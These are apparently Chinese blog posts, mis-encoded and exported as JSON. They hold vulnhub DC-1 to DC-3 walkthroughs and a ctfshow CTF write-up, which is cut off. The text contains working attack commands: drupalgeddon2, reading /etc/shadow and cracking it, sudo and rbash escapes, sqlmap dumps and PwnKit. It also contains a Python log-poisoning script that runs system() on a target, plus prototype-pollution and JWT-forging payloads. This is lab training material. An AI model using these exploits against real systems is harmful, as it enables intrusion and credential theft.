[{"content":"ã€Œ DC ã€æ˜¯ vulnhub ä¸Šçš„ç³»åˆ—é¶æœºï¼Œå› ä¸ºå‚åŠ çš„æŸä¸ªåŸ¹è®­è¯¾ç¨‹ç”¨ DC1-3 è¿™ä¸‰ä¸ªç¯å¢ƒä½œä¸ºç»ƒä¹ é¢˜ç›®ï¼Œæ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹\nç½‘ç»œè®¾ç½® é¶æœºä½¿ç”¨çš„æ˜¯é™æ€ IP åœ°å€å’Œè™šæ‹Ÿæœºçš„ã€Œæ¡¥æ¥ç½‘ç»œã€æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼ä¼šæŠŠå®¿ä¸»æœºæ‰€åœ¨ç½‘æ®µçš„ IP åˆ†é…ç»™è™šæ‹Ÿæœºï¼Œè€Œå®¿ä¸»æœºæ‰€åœ¨çš„ç½‘æ®µæœªå¿…å’Œé¶æœºè®¾ç½®çš„é™æ€ç½‘æ®µç›¸åŒï¼Œè¿™å°±å¯¼è‡´ç½‘å¡æ— æ³•æ­£å¸¸å¯åŠ¨\né‚£ä¹ˆé¦–å…ˆè¦è¿›å…¥ç³»ç»Ÿä¿®æ”¹ /etc/network/interfaces æ–‡ä»¶ï¼Œæ”¹æˆ DHCP çš„æ–¹å¼è·å– IPã€‚å› ä¸ºé¶æœºæ²¡æœ‰æä¾›ç³»ç»Ÿç”¨æˆ·å¯†ç ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ GRUB çš„å¯åŠ¨å‚æ•°è¿›å…¥ç³»ç»Ÿ1\nä»¥é¶æœºçš„ Debian ç³»ç»Ÿä¸ºä¾‹ï¼ˆå…¶ä»–ç³»ç»Ÿä¼šæœ‰åŒºåˆ«ï¼‰ï¼Œè¿›å…¥å¯åŠ¨èœå•åæŒ‰ e ç¼–è¾‘\næ‰¾åˆ° roï¼ˆ read-only ï¼‰ï¼Œæ”¹æˆã€Œå¯å†™ã€æƒé™å¹¶æŒ‡å®šå¯åŠ¨ shell\nrw signie init=/bin/bash è¿›å…¥ç³»ç»Ÿåç¼–è¾‘ /etc/network/interfacesï¼ŒæŠŠ eth0 ç½‘å¡æ”¹æˆ DHCP\nallow-hotplug eth0 iface eth0 inet dhcp è‡ªåŠ¨è·å– IP\ndhclient eth0 ç„¶åé‡å¯\nDC-1 nmap -sV æ”¶é›†ç«¯å£ä¿¡æ¯\n22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) 80/tcp open http Apache httpd 2.2.22 ((Debian)) 111/tcp open rpcbind 2-4 (RPC #100000) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80 ç«¯å£æ˜¯ Drupal CMSï¼Œåº”è¯¥æ˜¯ CVE-2018-7600 ä½†æ˜¯æˆ‘ç”¨ nuclei æ²¡æ‰«å‡ºæ¥ğŸ¤”\nç”¨ metasploit çš„ drupal_drupalgeddon2 æ¨¡å—ç›´æ¥æ‹¿åˆ° shell\nuse unix/webapp/drupal_drupalgeddon2 set RHOSTS 192.168.124.5 run ... meterpreter \u0026gt; shell -it ç½‘ç«™æ ¹ç›®å½• flag1.txt ä¸­æœ‰æç¤º\nEvery good CMS needs a config file - and so do you. æ ¹æ®æç¤ºæœä¸€ä¸‹é…ç½®æ–‡ä»¶\nfind . -name settings* # ./sites/default/settings.php \u0026lt;?php /** * * flag2 * Brute force and dictionary attacks aren't the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */ $databases = array ( 'default' =\u0026gt; array ( 'default' =\u0026gt; array ( 'database' =\u0026gt; 'drupaldb', 'username' =\u0026gt; 'dbuser', 'password' =\u0026gt; 'R0ck3t', 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; '', 'driver' =\u0026gt; 'mysql', 'prefix' =\u0026gt; '', ), ), ); ... Code Snippet 1: settings.php å°è¯•ç™»å½• mysqlï¼Œæ³¨æ„ -p å‚æ•°å’Œå¯†ç é—´ä¸è¦æœ‰ç©ºæ ¼\nmysql -udbuser -pR0ck3t åœ¨ drupaldb.users è¡¨é‡Œæ‰¾åˆ°ä¸‰ä¸ªç”¨æˆ·ï¼Œå¯†ç éƒ½æ˜¯ç»è¿‡åŠ å¯†çš„\nname pass admin $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR Fred $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg test $S$DTwWb.MjZ8ihU.gMo1vZu32NCKL5p6YJpDVqgorKBibR/bdHK6/k ç›´æ¥ç ´è§£å¯†æ–‡æ¯”è¾ƒéš¾ï¼Œè€Œä¸”å®˜æ–¹æä¾›äº†å¯†ç çš„åŠ å¯†è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬åŠ å¯†ä¸€ä¸ªæ–°å¯†ç æ›¿æ¢ admin çš„åŸå¯†ç 2\nwww-data@DC-1:/var/www$ php ./scripts/password-hash.sh 1234 password: 1234 hash: $S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK mysql\u0026gt; update drupaldb.users set pass='$S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK' where name='admin'; ä¿®æ”¹å¯†ç åç™»å½•åå°ï¼Œåœ¨ Content é¡µæ‰¾åˆ° flag3ï¼Œåˆæ˜¯æ–°çš„æç¤º\nSpecial PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow. è¿™é‡Œ PERMS å’Œ FIND ä¸¤ä¸ªå¤§å†™å•è¯ç»™äº†æç¤ºï¼Œåº”è¯¥æ˜¯ç”¨ find çš„ SUID ææƒè¯»å– shadow æ–‡ä»¶å†…å®¹\nfind . -exec cat /etc/shadow \\; -quit root:$6$91zYUPrB$A/i0KqmGAi.forD5idrSFrDlPGLDoHr33g0gTfW8oJsCBptPsNRNoc0XoqkCwvFU4XMqrocm4KYtPBLqorFpW0:19823:0:99999:7::: daemon:*:17946:0:99999:7::: bin:*:17946:0:99999:7::: sys:*:17946:0:99999:7::: sync:*:17946:0:99999:7::: games:*:17946:0:99999:7::: man:*:17946:0:99999:7::: lp:*:17946:0:99999:7::: mail:*:17946:0:99999:7::: news:*:17946:0:99999:7::: uucp:*:17946:0:99999:7::: proxy:*:17946:0:99999:7::: www-data:*:17946:0:99999:7::: backup:*:17946:0:99999:7::: list:*:17946:0:99999:7::: irc:*:17946:0:99999:7::: gnats:*:17946:0:99999:7::: nobody:*:17946:0:99999:7::: libuuid:!:17946:0:99999:7::: Debian-exim:!:17946:0:99999:7::: statd:*:17946:0:99999:7::: messagebus:*:17946:0:99999:7::: sshd:*:17946:0:99999:7::: mysql:!:17946:0:99999:7::: flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7::: æ‹¿åˆ° shadow çš„å†…å®¹åç›´æ¥ç»™ john ç ´è§£å¾—åˆ°å¼±å£ä»¤\nâ¯ john dc1-shadow ... Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 123456 (root) orange (flag4) å…ˆ ssh ç™»å½• rootï¼Œç„¶åæ‰¾åˆ° /root/thefinalflag.txt\nWell done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7 å•Šï¼Ÿé€šå…³äº†ï¼Ÿé‚£ flag4 æ˜¯å•¥ï¼Ÿ\nç™»å½• flag4 æœ‰ä¸ªæç¤º /home/flag4/flag4.txt ğŸ¤”\nCan you use this same method to find or access the flag in root? Probably. But perhaps it's not that easy. Or maybe it is? DC-2 nmap æ‰«ä¸€ä¸‹åªæ‰«åˆ° 80 ç«¯å£ï¼Œç›´æ¥ç”¨ IP è®¿é—®ä¼šè¢«é‡å®šå‘åˆ° http://dc-2/ ï¼Œéœ€è¦ä¿®æ”¹ hosts æ–‡ä»¶\nè¿›å»åçŸ¥é“è¿™æ˜¯ä¸ª WordPress ç«™ç‚¹ï¼Œå¹¶ä¸”æ‰¾åˆ°ç¬¬ä¸€ä¸ªæç¤ºï¼ˆflag 1ï¼‰\né¦–å…ˆ nuclei æ‰«ä¸€ä¸‹ WordPressï¼Œç”¨ wpscan ä¹Ÿè¡Œï¼Œä½†æ˜¯ arch æºä»“åº“çš„ wpscan è²Œä¼¼å‡ºäº†ä¸ª bug\nè¿˜æ˜¯ç”¨ wpscan æ‰«æ¯”è¾ƒå¥½ï¼Œnuclei ç€é‡æ¼æ´ã€Œæ£€æµ‹ã€è€Œä¸æ˜¯ã€Œåˆ©ç”¨ã€ï¼Œæ‰«å‡ºæ¥çš„ç”¨æˆ·åä¸å…¨\nå¦‚ä½•ä½ å’Œæˆ‘ä¸€æ ·ç”¨çš„æ˜¯ Arch ç³»ç»Ÿï¼Œä»æºä»“åº“ä¸‹è½½çš„ wpscan å¯èƒ½ä¼šå‡ºç°é”™è¯¯\ncannot load such file -- ffi_c ç›´æ¥ç”¨ gemï¼ˆruby çš„åŒ…ç®¡ç†å™¨ï¼‰æ¥ä¸‹è½½å°±æ²¡é—®é¢˜äº†\ngem install wpscan wpscan --url http://dc-2 -e æ‰«å‡ºæ¥ä¸€ä¸ªç™»å½•é¡µå’Œç”¨æˆ·åæšä¸¾æ¼æ´ï¼Œå†è”ç³»åˆ° flag1 æç¤ºçš„ cewl æ˜¯ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·ï¼Œæ‰€ä»¥å°è¯•å¯¹æšä¸¾å‡ºæ¥çš„ç”¨æˆ·åè¿›è¡Œæš´åŠ›ç ´è§£\nå…ˆæ„å»ºä¸€ä¸ªå¯†ç å­—å…¸ï¼Œç„¶åç»“åˆ wpscan æ‰«å‡ºæ¥çš„ç”¨æˆ·åæš´åŠ›ç ´è§£\ncewl -w pass.txt http://dc-2 wpscan --url http://dc-2 -U admin,jerry,tom -P pass.txt tom å’Œ jerry éƒ½æ‰«å‡ºæ¥äº†å¼±å£ä»¤\nç™»å½•è¿›å»æ‰¾åˆ°æ–°æç¤ºï¼Œä¼¼ä¹ WordPress è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„ï¼Œå¾—å¦è¾Ÿè¹Šå¾„\nå‘ç°ä¸€å¼€å§‹ç”¨ nmap çš„é»˜è®¤å‚æ•°æ‰«ç«¯å£æ¼äº†ä¸€ä¸ªï¼Œåº”è¯¥æ‰«å…¨ç«¯å£çš„ğŸ˜…\nPORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) å°è¯•ä¸€ä¸‹å‘ç° tom çš„ wordpress å¯†ç å’Œ ssh å¯†ç ç›¸åŒï¼Œç›´æ¥ç™»å½•\nssh tom@dc-2 -p 7744 å‘ç° shell æ˜¯ rbashï¼Œå¾ˆå¤šå‘½ä»¤æ— æ³•ä½¿ç”¨ï¼Œå¯ä»¥ç”¨ compgen -c çœ‹çœ‹å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤æœ‰å“ªäº›\nçœ‹åˆ°å¯ä»¥è¿è¡Œ viï¼ˆå…¶å®è¿è¡Œçš„æ˜¯ vimï¼‰é‚£ä¹ˆå‚è€ƒ GTFOBins è¿›è¡Œææƒ\nvi --cmd ':set shell=/bin/bash|:shell' ä¹‹åå†æ‰§è¡Œå‘½ä»¤ä¼šæ˜¾ç¤º command not found ä½†å…¶å®å·²ç»æ‹¿åˆ°åŠŸèƒ½å®Œæ•´çš„ bash shell äº†ï¼Œæ›´æ–°ä¸€ä¸‹ PATH ç¯å¢ƒå˜é‡å³å¯æ‰§è¡Œå¸¸ç”¨å‘½ä»¤\nexport PATH=/bin:/sbin:/usr/bin:/usr/sbin cat flag3.txt # Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. æ ¹æ® flag3 çš„æç¤ºä½¿ç”¨ su åˆ‡æ¢åˆ° jerry ç”¨æˆ·ï¼Œå¯†ç æ˜¯ä¹‹å‰æ‰«å‡ºæ¥çš„ wordpress å¯†ç ï¼Œè¯»åˆ° flag4ï¼ˆtom ä¹Ÿèƒ½è¯»åˆ°ï¼‰\ncat /home/jerry/flag4.txt # Good to see that you've made it this far - but you're not home yet. # You still need to get the final flag (the only flag that really counts!!!). # No hints here - you're on your own now. :-) # Go on - git outta here!!!! è¿˜æœ‰æœ€åä¸€ä¸ª flagï¼Œè€Œä¸”æç¤ºäº† gitï¼Œè‡ªç„¶æƒ³åˆ°åˆ©ç”¨ git ææƒ\né¦–å…ˆæ£€æŸ¥ä¸€ä¸‹ jerry çš„ sudo åˆ—è¡¨ï¼Œå¯ä»¥æ‰§è¡Œ gitï¼ˆtom æ²¡æœ‰ sudo æƒé™ï¼‰\nsudo -l # User jerry may run the following commands on DC-2: # (root) NOPASSWD: /usr/bin/git è™½ç„¶ä¸å…è®¸è®¾ç½® PAGER ç¯å¢ƒå˜é‡ï¼Œä½†å¯ä»¥å…ˆè¿›å…¥é»˜è®¤ pager å†æ‰§è¡Œå‘½ä»¤\nsudo git -p help config !/bin/bash cat /root/final-flag.txt __ __ _ _ _ _ / / /\\ \\ \\___| | | __| | ___ _ __ ___ / \\ \\ \\/ \\/ / _ \\ | | / _` |/ _ \\| '_ \\ / _ \\/ / \\ /\\ / __/ | | | (_| | (_) | | | | __/\\_/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___\\/ Congratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it's all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7. DC-3 å…ˆæ‰«ä¸€ä¸‹å…¨ç«¯å£ï¼Œè¿™æ¬¡ç¡®å®šåªæœ‰ä¸€ä¸ª 80ï¼Œæ˜¯ä¸€ä¸ª Joomla ç«™ç‚¹\nnuclei ç›´æ¥æ‰«å‡ºæ¥åå°å’Œ CVE-2017-8917\nç”¨ sqlmap ç¿»ä¸€ä¸‹æ•°æ®åº“ï¼Œæ‰¾åˆ° admin çš„ç”¨æˆ·åå¯†ç \nsqlmap -u http://192.168.220.165/index.php\\?option\\=com_fields\\\u0026amp;view\\=fields\\\u0026amp;layout\\=modal\\\u0026amp;list\\[fullordering\\]\\=x\\* -D joomladb -T '#__users' -C name,username,password --dump --batch Joomla çš„å¯†ç ç”¨ bcrypt åŠ å¯†è¿‡ï¼Œä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯åƒå‰é¢ DC-1 ä¸€æ ·ä¿®æ”¹ admin çš„å¯†ç ï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯è¡¨åæœ‰ç‰¹æ®Šç¬¦å·çš„é—®é¢˜ï¼Œç”¨ sqlmap ä¸€ç›´æ²¡æœ‰ä¿®æ”¹æˆåŠŸã€‚ç„¶åæ”¹ç”¨ john ç ´è§£å‡ºå¯†ç ä¸º snoopy\necho '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' \u0026gt; pass \u0026amp;\u0026amp; john pass æ‹¿åˆ°ç®¡ç†å‘˜å¯†ç åç™»å½• joomla åå°ï¼Œå¯ä»¥ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶ï¼Œé€šè¿‡ PHP åå¼¹ shell3\nè®¿é—® /templates/beez3/error.php é¡µé¢è§¦å‘ï¼Œæ‹¿åˆ° www-data ç”¨æˆ·æƒé™çš„ shell\nä¸‹ä¸€æ­¥æ˜¯ææƒï¼ŒæŠŠ linux-exploit-suggester è„šæœ¬ä¼ ä¸Šå»æ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°ä¸å°‘ææƒé£é™©ç‚¹ï¼Œæˆ‘è¿™è¾¹ç”¨äº† PwnKit\néœ€è¦æŠŠ poc æºç ä¼ åˆ°é¶æœºä¸Šé¢ç¼–è¯‘ï¼Œä¸ç„¶å¯èƒ½å› ä¸º CPU æ¶æ„ä¸åŒæ‰§è¡Œä¸äº†ã€‚ææƒæˆåŠŸåæ‹¿åˆ° root ç”¨æˆ·ç›®å½•ä¸‹çš„ flag\nhttps://blog.csdn.net/qq_45290991/article/details/114189156\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://drupalchina.cn/node/2128\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.leavesongs.com/PHP/backshell-via-php.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2024-12-26","permalink":"https://zrquan.github.io/posts/dc1-3/","tags":["writeup","vulnhub"],"title":"DC 1-3 Writeup"},{"content":"ä¸»è¦æ˜¯ Webï¼Œä¹Ÿä¼šç»ƒä¸€ä¸‹ Misc\nå•èº«æ¯ easy_mem_1 ç”¨ MemProcFS åˆ†æå†…å­˜å¹¶æŒ‚è½½åˆ° dmp ç›®å½•\n./memprocfs -device ~/20241029-055419.dmp -mount ~/dmp è®¡ç®—æœºåï¼šdmp/sys/computername.txt IP åœ°å€ï¼šdmp/sys/net/netstat.txt build ç‰ˆæœ¬å·ï¼šdmp/sys/version-build.txt æœ€ç»ˆå¾—åˆ° ctfshow{ZHUYUN_S_PC_192.168.26.129_22621}\neasy_mem_2 ç»™ MemProcFS åŠ ä¸Š -forensic 1 å¯ç”¨ forensic mode\nå¯ä»¥æ‰¾åˆ°ç›®å½• dmp/forensic/files/ROOT/Users/h/Documents/Tencent Files/54297198 ä»¥ç¡®è®¤ QQ å·\nçŸ­å‰§åå’Œ BV å·éƒ½èƒ½åœ¨æµè§ˆå™¨å†å² dmp/forensic/web/web.txt ä¸­æ‰¾åˆ°\næœ€ç»ˆå¾—åˆ° ctfshow{54297198_ç©¿æˆé­”å°Šåæˆ‘ä¸€å¿ƒæ±‚æ­»_BV1ZU4y1G7AP}\neasy_mem_3 ç¿»ä¸€ä¸‹ dmp/sys/proc/proc-v.txt é‡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œçœ‹åˆ°ä¸€ä¸ªå¯ç–‘è¿›ç¨‹\n---- Hmohgnsyc.exe 10504 3940 32 U* h \\Device\\HarddiskVolume3\\Users\\h\\AppData\\Roaming\\ToDesk\\dev\\Hmohgnsyc.exe C:\\Users\\h\\AppData\\Roaming\\ToDesk\\dev\\Hmohgnsyc.exe \u0026quot;C:\\Users\\h\\AppData\\Roaming\\ToDesk\\dev\\Hmohgnsyc.exe\u0026quot; 2024-10-29 05:52:14 UTC -\u0026gt; *** Medium è¿™ä¸ªå« Hmohgnsyc.exe çš„ç¨‹åºæ”¾åœ¨ ToDesk çš„ç›®å½•é‡Œï¼ŒæŸ¥çœ‹è¯¥ç¨‹åºçš„ä¿¡æ¯ dmp/name/Hmohgnsyc.exe-10504/modules/Hmohgnsyc.exe/versioninfo.txt:\nCompany Name: http://www.jieba.net File Description: è¶…çº§è§£éœ¸æ ¸å¿ƒç»„ä»¶(å‡çº§ç•Œé¢) File Version: 1, 0, 0, 630 Internal Name: Update Legal Copyright: Copyright 2009 http://www.jieba.net Original Filename: Update.exe Product Name: Update Module Product Version: 1, 0, 0, 630 æœ€åæäº¤ï¼šctfshow{Hmohgnsyc.exe_todesk_jieba.net}\næ²¡è€³æœµéƒ½å¯ä»¥ mp3 æ–‡ä»¶å¸§å¤´éƒ¨ç»“æ„ä¸­ï¼Œæœ‰ä¸€ä¸ª original ä½ç”¨æ¥è¡¨ç¤ºæ–‡ä»¶æ˜¯å¦ä¸ºåŸç‰ˆï¼Œè¯¦æƒ…å‚è€ƒï¼šhttps://www.cnblogs.com/shakin/p/4012780.html\n010Editor æ‰“å¼€æ–‡ä»¶ï¼Œæ ¹æ®æç¤ºæ‰¾åˆ°ä»¥ä¸‹æ ‡å¿—ä½ï¼š\nå†™ä¸ªè„šæœ¬å°†æ‰€æœ‰æ ‡å¿—ä½æå–å‡ºæ¥\noriginal = \u0026quot;\u0026quot; with open(\u0026quot;fox01.mp3\u0026quot;, \u0026quot;rb\u0026quot;) as f: content = f.read() for i, b in enumerate(content): if b == 0xFF and content[i+1] == 0xFB and (content[i+2] in (0xE0, 0xE2)): # å°† bytes è½¬æˆäºŒè¿›åˆ¶è¡¨ç¤º binstr = \u0026quot;\u0026quot;.join(map(lambda b: f\u0026quot;{b:08b}\u0026quot;, content[i:i+4])) original += binstr[29] æ‹¿åˆ°äºŒè¿›åˆ¶å­—ç¬¦ä¸²åï¼Œé€šè¿‡è°ƒæ•´é•¿å®½æ¥å½¢æˆå¯è¯»çš„ flagï¼Œå¯ä»¥å†™ä¸ªè„šæœ¬å°†æ‰€æœ‰å¯èƒ½çš„é•¿å®½ç»„åˆéƒ½ç”Ÿæˆå›¾ç‰‡\nimport os from PIL import Image def create_images_from_binary(binstr: str, output_dir: str, max_width=1000): os.makedirs(output_dir, exist_ok=True) length = len(binstr) for width in range(1, max_width + 1): # è®¡ç®—é«˜åº¦ï¼Œå‘ä¸Šå–æ•´ height = (length + width - 1) // width image = Image.new(\u0026quot;1\u0026quot;, (width, height)) pixels = image.load() # å¡«å……åƒç´  for i in range(length): x = i % width y = i // width pixels[x, y] = int(binstr[i]) # å‰©ä½™åƒç´ è¡¥0 for i in range(length, height * width): x = i % width y = i // width pixels[x, y] = 0 image_path = os.path.join(output_dir, f\u0026quot;img_{width}x{height}.png\u0026quot;) image.save(image_path) print(f\u0026quot;Saved image: {image_path}\u0026quot;) create_images_from_binary(original.strip(), \u0026quot;images\u0026quot;) å¯ä»¥ä»å›¾ç‰‡ img_301x33.png ä¸­æŠ å‡º flag\nå¥½ç©çš„ PHP PHP é‡Œä¸€ä¸ªæ•°å­—çš„ md5 å€¼å’Œå®ƒçš„å­—ç¬¦ä¸²çš„ md5 å€¼æ˜¯ä¸€æ ·çš„ï¼Œå³ md5(123) === md5(\u0026quot;123\u0026quot;)\næ‰€ä»¥ç­”æ¡ˆæ˜¯ï¼š\n\u0026lt;?php class ctfshow { private $d = '1'; private $s = '2'; private $b = '3'; private $ctf = 123; } $o = new ctfshow(); echo urlencode(serialize($o)); ä¹Ÿå¯ä»¥ç”¨ INFï¼š\n\u0026lt;?php class ctfshow { private $d = 'I'; private $s = 'N'; private $b = 'F'; private $ctf = INF; } $o = new ctfshow(); echo urlencode(serialize($o)); è¿·é›¾é‡é‡ åœ¨ IndexController.php ä¸­æœ‰å‡ ä¸ª test å¼€å¤´çš„è·¯ç”±æ–¹æ³•ï¼Œæ¼æ´å…¶å®åœ¨ testJson æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•ä¼šè¯»å– JSON æ ¼å¼çš„è¯·æ±‚å‚æ•° dataï¼Œç„¶åé€šè¿‡ view('index/view', $data) å°†æ•°æ®ä¼ åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“\nview æ–¹æ³•çš„å®ç°ä½äº support/helpers.php\nfunction view(string $template, array $vars = [], string $app = null, string $plugin = null): Response { $request = \\request(); $plugin = $plugin === null ? ($request-\u0026gt;plugin ?? '') : $plugin; $handler = \\config($plugin ? \u0026quot;plugin.$plugin.view.handler\u0026quot; : 'view.handler'); return new Response(200, [], $handler::render($template, $vars, $app, $plugin)); } ä» config/view.php ä¸­å¯ä»¥æ‰¾åˆ°è¿›è¡Œæ¨¡æ¿æ¸²æŸ“çš„ handler ç±»ï¼Œç»§ç»­åˆ†æå®ƒçš„ render æ–¹æ³•ï¼Œå‘ç°ä¸€å¤„å˜é‡è¦†ç›–æ¼æ´\nåŸºäºè¿™ä¸ªå˜é‡è¦†ç›–æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥æ‰§è¡Œå‘½ä»¤ï¼š\næšä¸¾ /proc/{i}/cmdline æ¥è·å–ç½‘ç«™æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„ ç”¨ PHP ä»£ç è¦†ç›– __template_path__ å˜é‡ï¼Œé€šè¿‡è§¦å‘å¼‚å¸¸å°†ä»£ç å†™å…¥ webman çš„æ—¥å¿—æ–‡ä»¶ ç”±äº webman çš„æ—¥å¿—æ–‡ä»¶å‘½åç›¸å¯¹å›ºå®šï¼Œå¯ä»¥å†æ¬¡é€šè¿‡å˜é‡è¦†ç›–æ¥åŒ…å«åˆšåˆšå†™å…¥ä»£ç çš„æ—¥å¿—ï¼Œä»¥æ­¤æ‰§è¡Œä»£ç  å°†è¿™äº›æ­¥éª¤é€šè¿‡è„šæœ¬å®ç°ï¼š\nfrom datetime import datetime import json import httpx BASEURL = \u0026quot;https://55b74c3a-f741-41d3-803e-e327476e7f7b.challenge.ctf.show\u0026quot; URL = f\u0026quot;{BASEURL}/index/testJson\u0026quot; def get_webroot() -\u0026gt; str: with httpx.Client(verify=False) as cli: for i in range(1, 100): data = json.dumps( {\u0026quot;name\u0026quot;: \u0026quot;guest\u0026quot;, \u0026quot;__template_path__\u0026quot;: f\u0026quot;/proc/{i}/cmdline\u0026quot;} ) resp = cli.get(URL, params={\u0026quot;data\u0026quot;: data}) if \u0026quot;start.php\u0026quot; in resp.text: return resp.text.split(\u0026quot;start_file=\u0026quot;)[1][:-11] def write_payload(webroot: str, cmd: str): with httpx.Client(verify=False) as cli: data = json.dumps( { \u0026quot;name\u0026quot;: \u0026quot;guest\u0026quot;, \u0026quot;__template_path__\u0026quot;: f\u0026quot;\u0026lt;?php system('{cmd}');?\u0026gt;\u0026quot;, } ) resp = cli.get(URL, params={\u0026quot;data\u0026quot;: data}) # print(resp.text) def include_payload(webroot: str): with httpx.Client(verify=False) as cli: logfile = datetime.now().strftime(r\u0026quot;webman-%Y-%m-%d.log\u0026quot;) data = json.dumps( {\u0026quot;name\u0026quot;: \u0026quot;guest\u0026quot;, \u0026quot;__template_path__\u0026quot;: f\u0026quot;{webroot}/runtime/logs/{logfile}\u0026quot;} ) resp = cli.get(URL, params={\u0026quot;data\u0026quot;: data}) # print(resp.text) if __name__ == \u0026quot;__main__\u0026quot;: webroot = get_webroot() cmd = \u0026quot;cat /s000ecretF1ag999.txt\u0026quot; write_payload(webroot, f\u0026quot;{cmd} \u0026gt; {webroot}/public/stdout.txt\u0026quot;) include_payload(webroot) with httpx.Client(verify=False) as cli: cmd_stdout = cli.get(f\u0026quot;{BASEURL}/stdout.txt\u0026quot;).text print(cmd_stdout) ez_inject æ³¨å†Œç™»å½•åçœ‹åˆ°æç¤ºï¼Œå¹¶ä¸” Cookie ä¸­ä¼šè®¾ç½®ä¸€ä¸ª JWT\nä½ è§‰å¾—ä½ èƒ½çˆ†ç ´å‡ºæ¥å¯†é’¥ï¼Ÿæˆ‘è§‰å¾—å§ä¸å¦‚å»è¯•ç€æ±¡æŸ“ï¼Œåœ¨å“ªé‡Œå‘¢ï¼Ÿ ç™»å½•è¿˜æ˜¯æ³¨å†Œ?åˆ«å¿˜äº†æ³¨å†Œç”¨æˆ·å“¦ é‚£ä¹ˆè€ƒç‚¹è‡ªç„¶æ˜¯ Python åŸå‹é“¾æ±¡æŸ“ï¼ˆï¼‰å’Œ Flask\ntip: å®é™…ä¸Š Python ä¸­å¹¶æ²¡æœ‰åŸå‹é“¾è¿™ä¸ªæ¦‚å¿µï¼Œè€Œæ˜¯é€šè¿‡ç‰¹æ®Šå±æ€§/æ–¹æ³•è¾¾æˆç±»ä¼¼åŸå‹é“¾æ±¡æŸ“çš„æ”»å‡»æŠ€å·§\nåœ¨æ³¨å†Œæ¥å£å¯ä»¥é€šè¿‡å‘é€ä»¥ä¸‹æ•°æ®æ¥ç¯¡æ”¹ Flask çš„ SECRET_KEYï¼Œæ³¨æ„éœ€è¦ä¿®æ”¹æˆ JSON æ ¼å¼ï¼Œå› ä¸ºéœ€è¦åˆ©ç”¨å¯¹å­—å…¸çš„ merge æ“ä½œæ¥â€œæ±¡æŸ“åŸå‹é“¾â€\n{\u0026quot;username\u0026quot;: \u0026quot;hacker\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;qwe123\u0026quot;, \u0026quot;__init__\u0026quot;: {\u0026quot;__globals__\u0026quot;: {\u0026quot;app\u0026quot;: {\u0026quot;config\u0026quot;: {\u0026quot;SECRET_KEY\u0026quot;: \u0026quot;qwe123\u0026quot;}}}}} å®˜æ–¹ wp æ˜¯åƒè¿™æ ·ä¿®æ”¹ SECRET_KEY æ¥è·å–ç®¡ç†å‘˜æƒé™ï¼Œä½†å…¶å®å¯ä»¥ç›´æ¥â€œæ±¡æŸ“â€ is_admin\n{\u0026quot;username\u0026quot;: \u0026quot;hacker\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;qwe123\u0026quot;, \u0026quot;is_admin\u0026quot;: 1} ç„¶åä¿®æ”¹ JWT çš„ is_admin å­—æ®µè·å–ç®¡ç†å‘˜æƒé™\nflask-unsign --cookie \u0026quot;{'is_admin': 1, 'username': 'hacker'}\u0026quot; --secret qwe123 --sign # eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJoYWNrZXIifQ.Z1LH_w.xUsHvKI86GWV5Yw5uFA7Gec99o4 æ‹¿åˆ°ç®¡ç†å‘˜æƒé™åå¯ä»¥åœ¨ /secret ä¸­çœ‹åˆ°æç¤º\nYou can try to inject on \u0026quot;echo\u0026quot;! ç»è¿‡å°è¯•ç¡®è®¤ echo æ¥å£å­˜åœ¨ SSTIï¼Œåœ¨æ³¨å…¥æ—¶ä¸éœ€è¦å¤–é¢çš„å¤§æ‹¬å·ï¼Œè€Œä¸” waf æ‹¦æˆªäº†ä¸€äº›å…³é”®å­—ã€‚æœ€ç»ˆé€šè¿‡ä»¥ä¸‹ 